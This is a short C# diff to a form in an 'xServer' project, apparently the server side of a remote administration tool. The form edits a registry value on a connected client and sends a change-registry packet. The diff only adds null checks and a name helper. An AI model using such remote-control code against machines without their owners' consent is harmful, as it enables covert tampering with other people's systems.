@@ -28,13 +28,13 @@ namespace xServer.Forms
 
             InitializeComponent();
 
-            this.valueNameTxtBox.Text = value.Name;
-            this.valueDataTxtBox.Text = value.Data.ToString();
+            this.valueNameTxtBox.Text = RegValueHelper.GetName(value.Name);
+            this.valueDataTxtBox.Text = value.Data == null ? "" : value.Data.ToString();
         }
 
         private void okButton_Click(object sender, EventArgs e)
         {
-            if (valueDataTxtBox.Text != _value.Data.ToString())
+            if (_value.Data == null || valueDataTxtBox.Text != _value.Data.ToString())
             {
                 object valueData = valueDataTxtBox.Text;
                 new xServer.Core.Packets.ServerPackets.DoChangeRegistryValue(_keyPath, new RegValueData(_value.Name, _value.Kind, valueData)).Execute(_connectClient);
